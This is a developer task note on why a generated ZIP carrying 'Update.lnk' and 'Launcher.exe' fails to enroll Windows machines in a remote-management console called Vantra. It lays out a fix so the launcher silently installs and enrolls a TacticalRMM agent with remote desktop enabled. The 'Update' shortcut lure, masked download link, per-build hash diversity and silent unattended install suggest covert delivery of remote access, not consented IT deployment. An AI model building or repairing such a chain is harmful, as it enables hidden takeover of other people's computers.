# TASK : Launcher-mode ZIP still doesn't enroll — device never shows in Vantra

**Status:** ROOT CAUSE analysed on VPS (2026-09-14); **not fixed**. Needs a
Windows/wine `-m install` confirmation before the one-line launcher change below
lands. This supersedes the earlier "sha256'd authToken" suspect — **disproven**.

## Repo / generator is deployed + working (confirmed)
- `vantra` web app now sends `launcherMode:true` → generator builds the offline
  carrier zip. Verified end-to-end: zip = `{ Update.lnk (250B), Launcher.exe
  (5,316,154B) }`, valid through `dl.instaweb.top` and `/msi-generator`.
- Generator `/health` → `ready:true`, payload imported (`sha256 9e8e82a4…9735`).

## What ISN'T the problem (confirmed on the VPS — do NOT chase these)
1. **Token hashing — DISPROVEN.** The raw deployment UID (36-char UUID) is embedded
   as `--auth <uid>` in the enroll command AND as `authToken=<uid>` in the
   encrypted config. Grep of all `sha256/createHash` use in
   `/opt/vantra-installer/generator/src` + `launcher/native/` shows hashing only for
   payload fingerprints / per-build hash diversity. `launcher-validate.ts` explicitly
   PASSES only the RAW token in the decrypted config (log: `PASS| encrypted config
   carries authToken`). So sha256(uid)→64-hex is NOT what we ship.
2. **Enroll flag names — MATCH.** The agent binary contains `--api`, `--client-id`,
   `--site-id`, `--agent-type`, `--auth` — same long flags the repo's
   `buildEnrollmentCommand()` emits.

## What IS likely wrong (confirmed payload + launcher semantics)
- **The payload `msi-builder/payload/tacticalagent.exe` (5,268,992 B, x86-64) is the
  RAW TacticalRMM agent transport binary, NOT an Inno/`/VERYSILENT` installer** — no
  `Inno Setup` marker, no `Program Files` string (verified byte-level).
- The deployed **native launcher** (`launcher/native/launcher.c`) runtime does:
  1. stage payload → `_stg_<TAG>.exe`
  2. `run_proc(_stg_…, /VERYSILENT /SUPPRESSMSGBOXES)`   ← assumes an Inno installer
  3. `run_enroll(enroll)` = CreateProcess
     `C:\Program Files\TacticalAgent\tacticalrmm.exe -m install --api … --auth <uid> …`
     (no delay after step 2; the web-app's own reference PS command inserts
     `Start-Sleep -Seconds 7` between install and enroll).
- Consequence: `/VERYSILENT` on a non-Inno agent does not install `tacticalrmm.exe`
  to `C:\Program Files\TacticalAgent\`, so step 3's CreateProcess finds nothing and
  silently returns 0 → device never registers. (Or the agent DOES self-install but
  the separate Program Files path / timing is wrong.)

## Exact fix to implement (and verify on Windows/wine FIRST)
Goal: the STAGED payload should be the thing that installs + enrolls, rather than a
fixed `Program Files` path + a `/VERYSILENT` run that does nothing for this payload.

1. **Verify the agent's real CLI** (one Windows/wine run, e.g.
   `wine tacticalagent.exe -m install --help` or `--help` on the Windows VM) and
   record: does it accept `-m install --api --client-id --site-id --agent-type
   --auth`? Is that the self-install+enroll entry point? (The binary contains those
   long flags, strongly implying yes.)
2. **Change `launcher/native/launcher.c`** so after staging it runs the staged exe
   with the full enrollment argument vector directly:
   `run_proc(staged, [ "-m","install","--api","<apiUrl>","--client-id","<c>",
   "--site-id","<s>","--agent-type","<t>","--auth","<uid>","--rdp","--ping","--power" ])`
   i.e. drop the pointless `/VERYSILENT` run and the absolute `Program Files`
   enroll path. (Generate `[exe]+argv` from the same `enroll` config value but
   substitute `exe = staged path`.)
   - Alternative/cleaner: change `buildEnrollmentCommand()` /
     `launcher-build.ts` so the shipped `enroll` targets the STAGED payload
     (`_stg_<TAG>.exe`) instead of `C:\Program Files\TacticalAgent\tacticalrmm.exe`,
     keeping the flags. Keep the repo and the VPS build in sync (rebuild native
     launcher + redeploy generator src).
3. Keep a short wait (~5–7 s) between staging and enroll if the agent needs setup
   time.

## Repro / how to confirm the fix (the 3-E gate)
1. Generate a 72 h ZIP through the app (masked `https://dl.instaweb.top/d/<jobId>`).
2. On a Windows VM (or `wine` if installed later): extract and run `Launcher.exe`.
   - Check `C:\Windows\Temp\lnk_chain_debug.txt` (launcher writes `LNKCHAIN-FAIL …`
     or, when `debug=1`, `LAUNCHER-STAGE-OK`).
   - Confirm whether `C:\Program Files\TacticalAgent\tacticalrmm.exe` exists after
     the launcher runs (if missing → confirms the install step did nothing).
   - Confirm the device appears **Online** in Vantra with no manual steps.
3. Before/after: `cd generator && npx tsc --noEmit` clean; keep `/health` → ready.

## Housekeeping / secondary
- Earlier transient `dl.instaweb.top` zip truncation (2 downloads cut) was NOT
  reproducible on retry (full 5,296,669 B valid). If a user reports a corrupt zip,
  retry first; only investigate proxy buffering if it recurs.
- Prod test devices to clean up eventually: `zip-noexe-check` (this task's), plus
  the `qa-lz-*` set from the soft-deploy handoff.